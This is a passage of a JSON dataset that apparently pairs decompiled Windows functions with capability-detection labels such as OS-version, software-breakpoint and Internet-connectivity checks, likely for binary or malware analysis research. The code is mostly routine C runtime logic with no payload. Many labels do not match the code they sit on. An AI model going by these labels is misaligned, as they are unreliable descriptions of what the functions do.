(piVar2 = fcn.0040a890(arg_18h, arg_20h, arg_1ch, &var_4h, &var_8h),  var_4h < var_8h)))) {\n        do {\n            if (((*piVar2 <= arg_1ch) && (arg_1ch <= piVar2[1])) &&\n               ((iVar1 = *(piVar2[3] * 0x10 + piVar2[4] + -0xc),  iVar1 == 0 || (*(iVar1 + 8) == '\\0')))) {\n                fcn.0040e6ec(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n            }\n            var_4h = var_4h + 1;\n            piVar2 = piVar2 + 5;\n        } while (var_4h < var_8h);\n    }\n    return;\n}\n",
        "token_count": 550
    },
    "0040e811": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040e811(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    var_1ch = *(arg_ch + 8);\n    _auStack8 = auStack8;\n    if ((var_1ch < -1) || (*(arg_18h + 4) <= var_1ch)) {\n        fcn.0040edb9();\n    }\n    if (*arg_8h == -0x1f928c9d) {\n        if ((arg_8h[4] == 3) && (((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)) && (arg_8h[7] == 0)))) {\n            iVar2 = fcn.0040eadd();\n            if (*(iVar2 + 0x7c) == 0) {\n                return;\n            }\n            iVar2 = fcn.0040eadd();\n            arg_8h = *(iVar2 + 0x7c);\n            iVar2 = fcn.0040eadd();\n            arg_10h = *(iVar2 + 0x80);\n            _auStack8 = CONCAT13(1, auStack8);\n            iVar2 = fcn.00413738(arg_8h, 1);\n            if (iVar2 == 0) {\n                fcn.0040edb9();\n            }\n            if (*arg_8h != -0x1f928c9d) goto code_r0x0040e9ea;\n            if (((arg_8h[4] == 3) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)))) && (arg_8h[7] == 0)) {\n                fcn.0040edb9();\n            }\n        }\n        iVar2 = var_1ch;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521))))\n        {\n            piVar3 = fcn.0040a890(arg_18h, arg_20h, var_1ch, &var_ch, &var_20h);\n            var_8h = piVar3;\n            if (var_ch < var_20h) {\n                do {\n                    if ((*piVar3 == iVar2 || *piVar3 < iVar2) && (iVar2 <= piVar3[1])) {\n                        var_8h = piVar3;\n                        for (var_18h = piVar3[3]; 0 < var_18h; var_18h = var_18h + -1) {\n                            var_10h = *(arg_8h[7] + 0xc);\n                            for (var_14h = *var_10h; var_10h = var_10h + 1,  0 < var_14h; var_14h = var_14h + -1) {\n                                iVar2 = fcn.0040e20d(arg_8h[7]);\n                                piVar3 = var_8h;\n                                if (iVar2 != 0) {\n                                    fcn.0040e6ec(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n                                    goto code_r0x0040e9bd;\n                                }\n                            }\n                        }\n                    }\ncode_r0x0040e9bd:\n                    var_ch = var_ch + 1;\n                    piVar3 = piVar3 + 5;\n                    iVar2 = var_1ch;\n                    var_8h = piVar3;\n                } while (var_ch < var_20h);\n            }\n            if (arg_1ch == '\\0') {\n                return;\n            }\n            fcn.0040e348(arg_8h);\n            return;\n        }\n    }\ncode_r0x0040e9ea:\n    if (arg_1ch == '\\0') {\n        fcn.0040e753(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, var_1ch, arg_20h, arg_24h);\n        return;\n    }\n    fcn.0040bc40(0x443428, 8);\n    iVar2 = fcn.0040eadd();\n    if (*(iVar2 + 0x6c) != 0) {\n        _auStack8 = 0;\n        iVar2 = fcn.0040eadd();\n        (**(iVar2 + 0x6c))();\n        _auStack8 = 0xffffffff;\n    }\n    fcn.0041031f(10);\n    fcn.0041626d(0x16);\n    fcn.0040c93f(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1294
    },
    "0040ea15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040ea15(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    uint uVar1;\n    \n    if ((*arg_18h & 0x1fffffff) != 0x19930520) {\n        fcn.0040edb9();\n    }\n    if ((*(arg_8h + 1) & 0x66) == 0) {\n        if (arg_18h[3] != 0) {\n            if (((*arg_8h == -0x1f928c9d) && (0x19930520 < arg_8h[5])) && (*(arg_8h[7] + 8) != NULL)) {\n                uVar1 = (**(arg_8h[7] + 8))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff)\n                ;\n                return uVar1;\n            }\n            fcn.0040e811(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n        }\n    }\n    else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n        fcn.0040e27a(arg_ch, arg_14h, arg_18h, 0xffffffff);\n    }\n    return 1;\n}\n",
        "token_count": 380
    },
    "0040eac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040eac0(void)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    int32_t *piVar2;\n    \n    if (*0x44e328 != -1) {\n        (**0x451218)(*0x44e328);\n        *0x44e328 = -1;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n    piVar2 = 0x44e200;\n    do {\n        arg_8h = *piVar2;\n        if ((arg_8h != 0) && (piVar2[1] != 1)) {\n            (*pcVar1)(arg_8h);\n            fcn.00409f48(arg_8h);\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x44e320);\n    piVar2 = 0x44e200;\n    do {\n        if ((*piVar2 != 0) && (piVar2[1] == 1)) {\n            (*pcVar1)(*piVar2);\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x44e320);\n    return;\n}\n",
        "token_count": 286
    },
    "0040ec95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040ec95(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.0040d2b7();\n    if (iVar2 == 0) {\n        fcn.0040eac0();\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 != 0) {\n        *0x45120c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"FlsAlloc\");\n        *0x451210 = (*pcVar1)(iVar2, \"FlsGetValue\");\n        *0x451214 = (*pcVar1)(iVar2, \"FlsSetValue\");\n        *0x451218 = (*pcVar1)(iVar2, \"FlsFree\");\n        if (*0x451210 == 0) {\n            *0x451210 = _sym.imp.KERNEL32.dll_TlsGetValue;\n            *0x451214 = _sym.imp.KERNEL32.dll_TlsSetValue;\n            *0x45120c = 0x40eab7;\n            *0x451218 = _sym.imp.KERNEL32.dll_TlsFree;\n        }\n    }\n    *0x44e328 = (**0x45120c)(0x40eb4e);\n    if (((*0x44e328 != -1) && (puVar3 = fcn.0040c9f1(1, 0x8c),  puVar3 != NULL)) &&\n       (iVar2 = (**0x451214)(*0x44e328, puVar3),  iVar2 != 0)) {\n        puVar3[0x15] = 0x44e5d0;\n        puVar3[5] = 1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3[1] = 0xffffffff;\n        *puVar3 = uVar4;\n        return 1;\n    }\n    fcn.0040eac0();\n    return 0;\n}\n",
        "token_count": 488
    },
    "0040f277": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f277(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    int32_t iVar3;\n    \n    arg_8h_00 = arg_ch;\n    fcn.0040bbe0(arg_8h, 0, 0x90);\n    if (*arg_ch != '\\0') {\n        if ((*arg_ch != '.') || (arg_ch[1] == '\\0')) {\n            arg_ch = NULL;\n            do {\n                uVar2 = fcn.00410f50(arg_8h_00, 0x443b10);\n                if (uVar2 == 0) {\n                    return 0xffffffff;\n                }\n                cVar1 = arg_8h_00[uVar2];\n                if (arg_ch == NULL) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h;\n                    if (cVar1 == '.') {\n                        return 0xffffffff;\n                    }\n                }\n                else if (arg_ch == 0x1) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if (cVar1 == '_') {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x40;\n                }\n                else {\n                    if (arg_ch != 0x2) {\n                        return 0xffffffff;\n                    }\n                    if (0xf < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if ((cVar1 != '\\0') && (cVar1 != ',')) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x80;\n                }\n                fcn.00414460(iVar3, arg_8h_00, uVar2);\n                if ((cVar1 == ',') || (cVar1 == '\\0')) {\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n                arg_8h_00 = arg_8h_00 + uVar2 + 1;\n            } while( true );\n        }\n        fcn.00414460(arg_8h + 0x80, arg_ch + 1, 0xf);\n        *(arg_8h + 0x8f) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 538
    },
    "0040f353": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040f353(uint param_1, int32_t param_2)\n\n{\n    fcn.0040ee40(param_1, param_2);\n    if (*(param_2 + 0x40) != '\\0') {\n        fcn.0040f253(param_1, 2, 0x443b18, param_2 + 0x40);\n    }\n    if (*(param_2 + 0x80) != '\\0') {\n        fcn.0040f253(param_1, 2, 0x443b14, param_2 + 0x80);\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0040f49b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f49b(char *arg_8h, uchar *arg_ch, ushort *arg_10h, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_94h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if (arg_8h != NULL) {\n        if ((*arg_8h == 'C') && (arg_8h[1] == '\\0')) {\n            *arg_ch = 0x43;\n            arg_ch[1] = 0;\n            if (arg_10h != NULL) {\n                *arg_10h = 0;\n                arg_10h[1] = 0;\n                arg_10h[2] = 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 0;\n            }\n        }\n        else {\n            uVar1 = fcn.0040baf0(arg_8h);\n            if ((0x81 < uVar1) ||\n               ((iVar2 = fcn.0040ef40(0x44e448, arg_8h),  iVar2 != 0 &&\n                (iVar2 = fcn.0040ef40(0x44e3c0, arg_8h),  iVar2 != 0)))) {\n                iVar2 = fcn.0040f277(&var_94h, arg_8h);\n                if ((iVar2 != 0) || (iVar2 = fcn.00414cc3(&var_94h, 0x451220, &var_94h),  iVar2 == 0))\n                goto code_r0x0040f5ec;\n                *0x451228 = *0x451224;\n                fcn.0040f353(0x44e448, &var_94h);\n                if ((*arg_8h == '\\0') || (uVar1 = fcn.0040baf0(arg_8h),  0x81 < uVar1)) {\n                    arg_8h = 0x43d878;\n                }\n                *0x44e442 = 0;\n                fcn.00414460(0x44e3c0, arg_8h, 0x82);\n            }\n            if (arg_10h != NULL) {\n                fcn.0040b7b0(arg_10h, 0x451220, 6);\n            }\n            if (arg_14h != NULL) {\n                fcn.0040b7b0(arg_14h, 0x451228, 4);\n            }\n            fcn.0040ee40(arg_ch, 0x44e448);\n        }\n    }\ncode_r0x0040f5ec:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 639
    },
    "0040f5f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040f5f7(uint param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    int32_t in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint32_t arg_1ch;\n    uint32_t in_stack_fffffe50;\n    int32_t iStack420;\n    int32_t iStack404;\n    int32_t iStack400;\n    uchar uStack396;\n    uint8_t auStack395 [255];\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    iVar4 = fcn.0040f49b(param_1, auStack140, &stack0xfffffe50, &iStack404);\n    if (iVar4 != 0) {\n        iVar9 = unaff_ESI * 0xc;\n        iVar4 = fcn.0040ef40(auStack140, *(iVar9 + 0x44e4d4));\n        if (iVar4 != 0) {\n            iVar4 = fcn.0040baf0(auStack140);\n            iVar4 = fcn.00409f36(iVar4 + 1);\n            if (iVar4 != 0) {\n                arg_8h = *(iVar9 + 0x44e4d4);\n                puVar1 = unaff_ESI * 4 + 0x451340;\n                arg_1ch = *puVar1;\n                iStack400 = unaff_ESI * 6 + 0x451478;\n                fcn.0040b7b0(&stack0xfffffe3c, iStack400, 6);\n                iVar3 = *0x451358;\n                uVar5 = fcn.0040ee40(iVar4, auStack140);\n                *(iVar9 + 0x44e4d4) = uVar5;\n                *puVar1 = in_stack_fffffe50 & 0xffff;\n                fcn.0040b7b0(iStack400, &stack0xfffffe50, 6);\n                uVar8 = *0x44e680;\n                if (unaff_ESI == 2) {\n                    iStack400 = 0;\n                    *0x451358 = iStack404;\n                    iStack420 = *0x44e3bc;\n                    piVar6 = 0x44e398;\n                    iVar7 = *0x44e3b8;\n                    do {\n                        if (iStack404 == *piVar6) {\n                            if (iStack400 != 0) {\n                                iVar2 = iStack400 * 8;\n                                *0x44e398 = *(iVar2 + 0x44e398);\n                                *0x44e39c = *(iVar2 + 0x44e39c);\n                                *(iVar2 + 0x44e398) = iVar7;\n                                *(iVar2 + 0x44e39c) = iStack420;\n                            }\n                            break;\n                        }\n                        in_stack_fffffe44 = *piVar6;\n                        iStack400 = iStack400 + 1;\n                        *piVar6 = iVar7;\n                        iVar2 = piVar6[1];\n                        piVar6[1] = iStack420;\n                        piVar6 = piVar6 + 2;\n                        iVar7 = in_stack_fffffe44;\n                        iStack420 = iVar2;\n                    } while (piVar6 < 0x44e3c0);\n                    uVar8 = *0x44e39c;\n                    if (iStack400 == 5) {\n                        iVar7 = fcn.0041146b(1, 0x443a50, 0x7f, &uStack396, iStack404, *0x451348, 1, unaff_EDI, \n                                             unaff_EBX, in_stack_fffffe3c, in_stack_fffffe40, in_stack_fffffe44, \n                                             in_stack_fffffe48, arg_1ch, in_stack_fffffe50);\n                        if (iVar7 == 0) {\n                            *0x44e39c = 0;\n                        }\n                        else {\n                            uVar8 = 0;\n                            do {\n                                auStack395[uVar8 * 2] = auStack395[uVar8 * 2] & 1;\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 < 0x7f);\n                            iVar7 = fcn.0040c5d0(&uStack396, \n                                                 L\"        h((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10 \"\n                                                 , 0xfe);\n                            *0x44e39c = iVar7 == 0;\n                        }\n                        *0x44e398 = *0x451358;\n                        uVar8 = *0x44e39c;\n                    }\n                }\n                *0x44e680 = uVar8;\n                if (unaff_ESI == 1) {\n                    *0x45135c = iStack404;\n                }\n                iVar7 = (**(iVar9 + 0x44e4d8))();\n                if (iVar7 == 0) {\n                    if (arg_8h != 0x44e338) {\n                        fcn.00409f48(arg_8h);\n                    }\n                }\n                else {\n                    *(iVar9 + 0x44e4d4) = arg_8h;\n                    fcn.00409f48(iVar4);\n                    *puVar1 = arg_1ch;\n                    *0x451358 = iVar3;\n                }\n            }\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1512
    },
    "0040f886": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f886(char *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iStack152;\n    int32_t iStack144;\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    if (param_2 != 0) {\n        if (param_1 != NULL) {\n            fcn.0040f5f7(param_1);\n        }\n        goto code_r0x0040f9c0;\n    }\n    bVar1 = true;\n    iStack144 = 0;\n    if (param_1 != NULL) {\n        if (((*param_1 == 'L') && (param_1[1] == 'C')) && (param_1[2] == '_')) {\n            do {\n                pcVar2 = fcn.00410ec0(param_1, 0x443b2c);\n                if (((pcVar2 == NULL) || (iVar3 = pcVar2 - param_1,  iVar3 == 0)) || (*pcVar2 == ';'))\n                goto code_r0x0040f9c0;\n                iStack152 = 1;\n                puVar5 = 0x44e4dc;\n                do {\n                    iVar4 = fcn.00414e80(*puVar5, param_1, iVar3);\n                    if ((iVar4 == 0) && (iVar4 = fcn.0040baf0(*puVar5),  iVar3 == iVar4)) break;\n                    iStack152 = iStack152 + 1;\n                    puVar5 = puVar5 + 3;\n                } while (puVar5 < 0x44e50d);\n                pcVar2 = pcVar2 + 1;\n                iVar3 = fcn.00410f50(pcVar2, 0x43e6ac);\n                if ((iVar3 == 0) && (*pcVar2 != ';')) goto code_r0x0040f9c0;\n                if (iStack152 < 6) {\n                    fcn.00414460(auStack140, pcVar2, iVar3);\n                    auStack140[iVar3] = 0;\n                    iVar4 = fcn.0040f5f7(auStack140);\n                    if (iVar4 != 0) {\n                        iStack144 = iStack144 + 1;\n                    }\n                }\n            } while ((pcVar2[iVar3] != '\\0') && (param_1 = pcVar2 + iVar3 + 1,  *param_1 != '\\0'));\n        }\n        else {\n            iVar3 = fcn.0040f49b(param_1, auStack140, 0, 0);\n            if (iVar3 == 0) goto code_r0x0040f9c0;\n            puVar5 = 0x44e4d4;\n            do {\n                if (puVar5 != 0x44e4d4) {\n                    iVar3 = fcn.0040ef40(auStack140, *puVar5);\n                    if ((iVar3 == 0) || (iVar3 = fcn.0040f5f7(auStack140),  iVar3 != 0)) {\n                        iStack144 = iStack144 + 1;\n                    }\n                    else {\n                        bVar1 = false;\n                    }\n                }\n                puVar5 = puVar5 + 3;\n            } while (puVar5 < 0x44e511);\n            if (bVar1) {\n                fcn.0040f3dc();\n                fcn.00409f48(*0x44e4d4);\n                *0x44e4d4 = 0;\n                goto code_r0x0040f9c0;\n            }\n        }\n        if (iStack144 == 0) goto code_r0x0040f9c0;\n    }\n    fcn.0040f3dc();\ncode_r0x0040f9c0:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 926
    },
    "0040fbb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040fbb9(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint noname_3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x60 < arg_ch) && (arg_ch < 0x7b)) {\n            return arg_ch - 0x20;\n        }\n    }\n    else {\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 2;\n            }\n            else {\n                uVar3 = fcn.0040f03c(arg_8h, arg_ch, 2);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.004110af(*(uVar1 + 0x14), 0x200, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_ESI, \n                             unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034, in_stack_00000038);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 843
    },
    "0040fca4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fca4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040f03c(iVar1, param_1, 0x103);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 0x103;\n}\n",
        "token_count": 165
    },
    "0040fce3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fce3(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040f03c(iVar1, param_1, 1);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 1;\n}\n",
        "token_count": 160
    },
    "0040fd1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fd1d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040f03c(iVar1, param_1, 2);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 2;\n}\n",
        "token_count": 161
    },
    "0040fd57": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fd57(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040f03c(iVar1, param_1, 4);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 4;\n}\n",
        "token_count": 160
    },
    "0040fd91": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fd91(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040f03c(iVar1, param_1, 0x80);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 0x80;\n}\n",
        "token_count": 164
    },
    "0040fdd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fdd0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040f03c(iVar1, param_1, 8);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 8;\n}\n",
        "token_count": 161
    },
    "0040ff46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
